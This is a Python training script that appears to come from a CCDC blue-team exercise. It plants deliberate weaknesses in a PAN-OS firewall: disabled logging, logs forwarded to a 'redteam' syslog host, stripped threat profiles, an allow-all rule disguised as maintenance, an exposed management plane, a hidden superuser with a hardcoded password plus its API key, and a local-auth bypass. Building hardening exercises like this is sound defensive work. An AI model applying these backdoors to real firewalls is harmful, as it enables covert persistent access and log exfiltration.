#!/usr/bin/env python3
"""
CCDC PAN-OS Training - Dirty State Setup (PAN-OS 11.1.x)

Applies intentional misconfigurations to a standalone PAN-OS firewall
via the XML API for blue team hardening exercises.

Run standalone or via CCDC_PANOS_Run.py.
"""

import getpass
import json
import os
import sys
import xml.etree.ElementTree as ET

_HERE = os.path.dirname(os.path.abspath(__file__))
_PANOS_LIB = os.path.join(os.path.dirname(_HERE), "General_Scripts", "SetupScripts", "panos")
sys.path.insert(0, _HERE)
sys.path.insert(0, _PANOS_LIB)
from panos_lib import PanosAPI, DEVICE, VSYS

STATE_FILE = os.path.join(os.path.dirname(__file__), "panos_exercise_state.json")

# Names used for objects the setup script creates (all removed by cleanup)
ROGUE_ADMIN          = "netadmin"
ROGUE_PASS           = "Winter2024!"
ROGUE_SYSLOG_PROFILE = "ExternalLogging"
ROGUE_LOG_FWD        = "ExternalLogging"
ROGUE_URL_PROFILE    = "allow-all"
ROGUE_RULE           = "permit-all-traffic"
ROGUE_AUTH_PROFILE   = "LocalBypass"
SYSLOG_IP            = "172.31.40.6"
SYSLOG_PORT          = "514"


def vsys(path=""):
    return f"/config/devices/entry[@name='{DEVICE}']/vsys/entry[@name='{VSYS}']{path}"

def dev(path=""):
    return f"/config/devices/entry[@name='{DEVICE}']{path}"

def net(path=""):
    return f"/config/devices/entry[@name='{DEVICE}']/network{path}"


# ---------------------------------------------------------------------------
# Individual misconfiguration functions
# ---------------------------------------------------------------------------

def disable_rule_logging(api, state):
    """Turn off log-end and log-start on every security rule."""
    rules = api.security_rules()
    state["rule_logging"] = {}
    for rule in rules:
        base = vsys(f"/rulebase/security/rules/entry[@name='{rule}']")
        r_end   = api.config_get(f"{base}/log-end").findtext(".//log-end") or "yes"
        r_start = api.config_get(f"{base}/log-start").findtext(".//log-start") or "no"
        state["rule_logging"][rule] = {"log-end": r_end, "log-start": r_start}
        api.config_set(f"{base}/log-end",   "<log-end>no</log-end>")
        api.config_set(f"{base}/log-start", "<log-start>no</log-start>")
        print(f"    Disabled logging on rule: {rule}")


def add_rogue_syslog(api, state):
    """Create syslog server profile pointing to 172.31.40.6 and wire it to system + traffic logs."""
    # Syslog server profile (device level)
    api.config_set(
        dev(f"/server-profile/syslog/entry[@name='{ROGUE_SYSLOG_PROFILE}']"),
        f"""<server>
          <entry name="redteam">
            <server>{SYSLOG_IP}</server>
            <transport>UDP</transport>
            <port>{SYSLOG_PORT}</port>
            <format>BSD</format>
            <facility>LOG_USER</facility>
          </entry>
        </server>""",
    )
    print(f"    Created syslog profile '{ROGUE_SYSLOG_PROFILE}' -> {SYSLOG_IP}:{SYSLOG_PORT}")

    # Wire to system/config logs
    orig_sys = api.config_get(dev("/deviceconfig/system/syslog")).findtext(".//syslog") or ""
    state["system_syslog"] = orig_sys
    api.config_set(dev("/deviceconfig/system/syslog"), f"<syslog>{ROGUE_SYSLOG_PROFILE}</syslog>")
    print("    Redirected system logs to rogue syslog")

    # Log forwarding profile for traffic/threat logs
    api.config_set(
        vsys(f"/log-settings/profiles/entry[@name='{ROGUE_LOG_FWD}']"),
        f"""<match-list>
          <entry name="all-traffic">
            <log-type>traffic</log-type>
            <filter>All Logs</filter>
            <send-syslog><member>{ROGUE_SYSLOG_PROFILE}</member></send-syslog>
          </entry>
          <entry name="all-threat">
            <log-type>threat</log-type>
            <filter>All Logs</filter>
            <send-syslog><member>{ROGUE_SYSLOG_PROFILE}</member></send-syslog>
          </entry>
        </match-list>""",
    )

    # Apply log forwarding profile to all security rules
    rules = api.security_rules()
    state["rule_log_setting"] = {}
    for rule in rules:
        base = vsys(f"/rulebase/security/rules/entry[@name='{rule}']")
        orig = api.config_get(f"{base}/log-setting").findtext(".//log-setting") or ""
        state["rule_log_setting"][rule] = orig
        api.config_set(f"{base}/log-setting", f"<log-setting>{ROGUE_LOG_FWD}</log-setting>")
    print(f"    Applied rogue log forwarding to {len(rules)} security rules")

    state["rogue_syslog_created"] = True


def set_url_filtering_allow_all(api, state):
    """Create a permissive URL filtering profile and apply it to all security rules."""
    # A profile with no block list allows everything
    api.config_set(
        vsys(f"/profiles/url-filtering/entry[@name='{ROGUE_URL_PROFILE}']"),
        """<credential-enforcement>
          <mode><disabled/></mode>
          <log-severity>informational</log-severity>
        </credential-enforcement>""",
    )
    print(f"    Created allow-all URL filtering profile '{ROGUE_URL_PROFILE}'")

    rules = api.security_rules()
    state["rule_url_profile"] = {}
    for rule in rules:
        url_xpath = vsys(f"/rulebase/security/rules/entry[@name='{rule}']/profile-setting/profiles/url-filtering")
        orig = api.config_get(url_xpath).findtext(".//member") or ""
        state["rule_url_profile"][rule] = orig
        api.config_set(url_xpath, f"<url-filtering><member>{ROGUE_URL_PROFILE}</member></url-filtering>")
    print(f"    Applied allow-all URL profile to {len(rules)} rules")

    state["rogue_url_profile_created"] = True


def remove_security_profiles(api, state):
    """Strip AV/IPS/spyware profiles from all security rules."""
    rules = api.security_rules()
    state["rule_profiles"] = {}
    for rule in rules:
        xpath = vsys(f"/rulebase/security/rules/entry[@name='{rule}']/profile-setting")
        result = api.config_get(xpath)
        el = result.find(".//profile-setting")
        state["rule_profiles"][rule] = ET.tostring(el, encoding="unicode") if el is not None else ""
        if api.ok(api.config_delete(xpath)):
            print(f"    Stripped security profiles from rule: {rule}")


def disable_dns_sinkholing(api, state):
    """Remove DNS sinkhole configuration from all anti-spyware profiles."""
    profiles = api.spyware_profiles()
    state["spyware_sinkhole"] = {}
    for profile in profiles:
        xpath = vsys(f"/profiles/spyware/entry[@name='{profile}']/botnet-domains/sinkhole")
        result = api.config_get(xpath)
        el = result.find(".//sinkhole")
        state["spyware_sinkhole"][profile] = ET.tostring(el, encoding="unicode") if el is not None else ""
        if api.ok(api.config_delete(xpath)):
            print(f"    Disabled DNS sinkholing in spyware profile: {profile}")


def disable_app_id(api, state):
    """Replace application list with 'any' on all security rules, bypassing App-ID."""
    rules = api.security_rules()
    state["rule_application"] = {}
    for rule in rules:
        xpath = vsys(f"/rulebase/security/rules/entry[@name='{rule}']/application")
        result = api.config_get(xpath)
        members = [m.text for m in result.findall(".//member")]
        state["rule_application"][rule] = members
        api.config_edit(xpath, "<application><member>any</member></application>")
        print(f"    Set application=any on rule: {rule}")


def disable_ssl_decryption(api, state):
    """Disable all decryption rules."""
    rules = api.decryption_rules()
    state["decryption_rules_disabled"] = []
    for rule in rules:
        xpath = vsys(f"/rulebase/decryption/rules/entry[@name='{rule}']")
        already = api.config_get(f"{xpath}/disabled").findtext(".//disabled") == "yes"
        if not already:
            api.config_set(f"{xpath}/disabled", "<disabled>yes</disabled>")
            state["decryption_rules_disabled"].append(rule)
            print(f"    Disabled decryption rule: {rule}")


def add_permissive_rule(api, state):
    """Insert a catch-all permit-any rule with logging disabled."""
    api.config_set(
        vsys(f"/rulebase/security/rules/entry[@name='{ROGUE_RULE}']"),
        """<from><member>any</member></from>
<to><member>any</member></to>
<source><member>any</member></source>
<destination><member>any</member></destination>
<source-user><member>any</member></source-user>
<category><member>any</member></category>
<application><member>any</member></application>
<service><member>any</member></service>
<action>allow</action>
<log-end>no</log-end>
<description>MAINTENANCE-DO-NOT-REMOVE</description>""",
    )
    print(f"    Added permissive catch-all rule: {ROGUE_RULE}")
    state["rogue_rule_created"] = True


def disable_zone_flood_protection(api, state):
    """Delete flood protection config from all zone protection profiles."""
    profiles = api.zone_protection_profiles()
    state["zone_flood"] = {}
    for profile in profiles:
        xpath = net(f"/profiles/zone-protection-profile/entry[@name='{profile}']/flood")
        result = api.config_get(xpath)
        el = result.find(".//flood")
        state["zone_flood"][profile] = ET.tostring(el, encoding="unicode") if el is not None else ""
        if api.ok(api.config_delete(xpath)):
            print(f"    Removed flood protection from zone profile: {profile}")


def expose_management_plane(api, state):
    """Remove permitted-ip restrictions so management plane is reachable from any IP."""
    xpath = dev("/deviceconfig/system/permitted-ip")
    result = api.config_get(xpath)
    el = result.find(".//permitted-ip")
    state["permitted_ips"] = ET.tostring(el, encoding="unicode") if el is not None else ""
    if api.ok(api.config_delete(xpath)):
        print("    Removed management interface IP restrictions (open to all IPs)")
    state["management_exposed"] = True


def create_rogue_admin(api, state):
    """Create a second superuser with a normal-sounding name."""
    phash = api.get_password_hash(ROGUE_PASS)
    api.config_set(
        dev(f"/mgt-config/users/entry[@name='{ROGUE_ADMIN}']"),
        f"""<phash>{phash}</phash>
<permissions>
  <role-based>
    <superuser>yes</superuser>
  </role-based>
</permissions>""",
    )
    print(f"    Created rogue superuser: '{ROGUE_ADMIN}' / '{ROGUE_PASS}'")
    state["rogue_admin_created"] = True


def add_local_auth_bypass(api, state):
    """Create a local-database auth profile and set it as the management auth profile."""
    # Save original management auth profile
    orig = api.config_get(dev("/deviceconfig/system/authentication-profile")).findtext(".//authentication-profile") or ""
    state["original_mgmt_auth_profile"] = orig

    # Create local-database auth profile
    api.config_set(
        dev(f"/mgt-config/authentication-profile/entry[@name='{ROGUE_AUTH_PROFILE}']"),
        """<method><local-database/></method>
<allow-list><member>all</member></allow-list>""",
    )

    # Set it as the active management authentication profile
    api.config_set(
        dev("/deviceconfig/system/authentication-profile"),
        f"<authentication-profile>{ROGUE_AUTH_PROFILE}</authentication-profile>",
    )
    print(f"    Created local auth bypass profile '{ROGUE_AUTH_PROFILE}' and set as active mgmt auth")
    state["rogue_auth_profile_created"] = True


def generate_rogue_api_key(api, state):
    """Generate an API key for the rogue admin. Printed for instructor only."""
    import requests, urllib3
    urllib3.disable_warnings()
    r = requests.get(
        f"https://{api.host}/api/",
        params={"type": "keygen", "user": ROGUE_ADMIN, "password": ROGUE_PASS},
        verify=False,
        timeout=15,
    )
    root = ET.fromstring(r.text)
    key = root.findtext(".//key")
    if key:
        state["rogue_api_key"] = key
        print()
        print("  +------------------------------------------------------------------+")
        print("  |  ROGUE API KEY — INSTRUCTOR ONLY. DO NOT share with blue team.  |")
        print(f"  |  {key[:60]}  |")
        if len(key) > 60:
            print(f"  |  {key[60:]}  |")
        print("  +------------------------------------------------------------------+")
        print()
    else:
        print("  [!] Could not generate rogue API key. Commit may still be in progress.")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

STEPS = [
    ("Disabling security rule logging",        disable_rule_logging),
    ("Redirecting syslog to 172.31.40.6",      add_rogue_syslog),
    ("Setting URL filtering to allow-all",     set_url_filtering_allow_all),
    ("Stripping security profiles from rules", remove_security_profiles),
    ("Disabling DNS sinkholing",               disable_dns_sinkholing),
    ("Disabling App-ID on rules",              disable_app_id),
    ("Disabling SSL/TLS decryption",           disable_ssl_decryption),
    ("Adding catch-all permit-any rule",       add_permissive_rule),
    ("Disabling zone flood protection",        disable_zone_flood_protection),
    ("Exposing management plane",              expose_management_plane),
    ("Creating rogue superuser",               create_rogue_admin),
    ("Setting local auth bypass",              add_local_auth_bypass),
]


def run_setup(api):
    state = {}
    print("\n[*] Applying dirty state misconfigurations...\n")
    for label, func in STEPS:
        print(f"[*] {label}...")
        try:
            func(api, state)
        except Exception as e:
            print(f"    [!] Skipped: {e}")

    api.commit("CCDC Training — Dirty State Applied")

    print("\n[*] Generating rogue API key (commit required first)...")
    try:
        generate_rogue_api_key(api, state)
    except Exception as e:
        print(f"    [!] {e}")

    with open(STATE_FILE, "w") as f:
        json.dump(state, f, indent=2)
    print(f"[*] Exercise state saved to {STATE_FILE}")
    print("[+] Setup complete. Blue team exercise can begin.\n")
    return state


if __name__ == "__main__":
    host = input("Firewall IP: ").strip()
    use_key = input("Use existing API key? (y/N): ").strip().lower() == "y"
    if use_key:
        api_key = input("API key: ").strip()
        api = PanosAPI(host, api_key)
    else:
        username = input("Username: ").strip()
        password = getpass.getpass("Password: ")
        try:
            api = PanosAPI.from_credentials(host, username, password)
            print("[+] API key generated successfully.")
        except (ValueError, ConnectionError) as e:
            print(f"[!] {e}")
            print("[*] Falling back to manual API key entry.")
            api_key = input("API key: ").strip()
            api = PanosAPI(host, api_key)

    run_setup(api)
